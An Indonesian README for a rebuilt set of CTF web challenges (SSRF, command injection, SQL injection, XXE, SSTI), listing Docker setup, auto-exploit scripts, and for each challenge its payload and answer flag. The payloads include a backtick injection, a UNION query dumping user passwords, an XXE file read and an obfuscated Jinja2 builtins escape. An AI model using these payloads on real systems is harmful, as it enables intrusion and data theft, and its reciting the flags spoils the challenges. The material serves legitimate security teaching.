# 🚩 CTF Challenge Rebuild - Web Exploitation

Rebuild dari challenge CTF LEEXY (Seleksi GEMASTIK) - fokus kategori **Web**.
Setiap challenge memiliki folder `chall/` (source code + Dockerfile) dan `exploit/` (auto-exploit script).

---

## 📦 Struktur Folder

```
challenge/
├── docker-compose.yml          # Jalankan semua challenge sekaligus
├── fetcher/
│   ├── chall/                  # SSRF Challenge
│   │   ├── app.py
│   │   ├── Dockerfile
│   │   └── requirements.txt
│   └── exploit/
│       └── fetcher_exploit.py
├── nslookup/
│   ├── chall/                  # Command Injection Challenge
│   │   ├── app.py
│   │   ├── Dockerfile
│   │   └── requirements.txt
│   └── exploit/
│       └── nslookup_exploit.py
├── gag-wiki/
│   ├── chall/                  # SQL Injection Challenge
│   │   ├── app.py
│   │   ├── Dockerfile
│   │   └── requirements.txt
│   └── exploit/
│       └── gagwiki_exploit.py
└── svg-viewer/
    ├── chall/                  # XXE Injection Challenge
    │   ├── dashboard.php
    │   ├── index.php
    │   └── Dockerfile
    └── exploit/
        └── svgviewer_exploit.py
```

---

## 🚀 Quick Start

### Jalankan Semua Challenge
```bash
cd challenge
docker compose up --build -d
```

### Akses Challenge
| Challenge    | Port   | URL                        | Kerentanan          |
|-------------|--------|----------------------------|---------------------|
| Fetcher     | 5000   | http://localhost:5000      | SSRF Bypass         |
| Nslookup    | 5001   | http://localhost:5001      | Command Injection   |
| GaG Wiki    | 5002   | http://localhost:5002      | SQL Injection       |
| SVG Viewer  | 8888   | http://localhost:8888      | XXE Injection       |
| PassForge   | 8120   | http://localhost:8120      | SSTI Injection      |

---

## 🔓 Auto-Exploit

Setiap challenge memiliki script exploit otomatis. Jalankan setelah challenge aktif:

```bash
# Install dependencies
pip install requests

# Jalankan exploit
python fetcher/exploit/fetcher_exploit.py http://localhost:5000
python nslookup/exploit/nslookup_exploit.py http://localhost:5001
python gag-wiki/exploit/gagwiki_exploit.py http://localhost:5002
python svg-viewer/exploit/svgviewer_exploit.py http://localhost:8888
```

---

## 📝 Detail Challenge

### 1. Fetcher (SSRF)
- **Kerentanan:** Server-Side Request Forgery dengan bypass filter
- **Deskripsi:** Aplikasi memblokir `localhost` dan `127.0.0.1` tapi bisa dibypass dengan representasi IP alternatif
- **Bypass:** `http://0x7f000001:5000/flag` (hexadecimal IP)
- **Flag:** `LEEXY{_r_u_the_next_cve_hunter_a8cdaf}`

### 2. Nslookup (Command Injection)
- **Kerentanan:** Command Injection via backtick
- **Deskripsi:** Aplikasi menjalankan `nslookup` dengan `shell=True` dan blacklist yang tidak lengkap (backtick ` tidak diblokir)
- **Payload:** `` `cat /flag.txt`.x ``
- **Flag:** `LEEXY{54fb3ec7adecdcb1930ef0528366b98e}`

### 3. GaG Wiki (SQL Injection)
- **Kerentanan:** SQL Injection pada parameter pencarian
- **Deskripsi:** Query dibangun via string concatenation tanpa parameterized query
- **Payload:** `' UNION SELECT username,password,'x' FROM users--`
- **Flag:** `LEEXY{7bcb6131d0c9f5e4e7e52f50073eeefd}`

### 4. SVG Viewer (XXE Injection)
- **Kerentanan:** XML External Entity Injection
- **Deskripsi:** Parser XML menggunakan `LIBXML_NOENT | LIBXML_DTDLOAD` yang memungkinkan entity expansion. Direktori `.git` juga terekspos.
- **Payload SVG:**
  ```xml
  <?xml version="1.0" standalone="yes"?>
  <!DOCTYPE svg [
    <!ENTITY flag SYSTEM "file:///flag.txt">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <title>&flag;</title>
  </svg>
  ```
- **Flag:** `LEEXY{670ef0276339a9989da10a47d46a6115}`

### 5. PassForge (SSTI Injection)
- **Kerentanan:** Server-Side Template Injection pada fitur Smart Import
- **Deskripsi:** Aplikasi memproses file CSV yang diunggah dan merender isinya menggunakan Jinja2, memungkinkan RCE atau pembacaan file lokal.
- **Payload:** 
```python
SSTI_PAYLOAD = (
    "template\n"
    '{%set a="_"%}'
    '{%set f="/fl"%}'
    '{%set g="ag.txt"%}'
    '{%set bl=cycler|attr(a+a+"init"+a+a)|attr(a+a+"globals"+a+a)'
    '|attr(a+a+"getitem"+a+a)(a+a+"builtins"+a+a)%}'
    '{{bl|attr(a+a+"getitem"+a+a)("open")(f+g)|attr("read")()}}'
)
```
- **Flag:** `LEEXY{passforge_placeholder_flag}`

---

## ⚠️ Disclaimer

Challenge ini dibuat untuk keperluan edukasi dan pembelajaran CTF. 
Jangan gunakan teknik-teknik ini pada sistem tanpa izin.
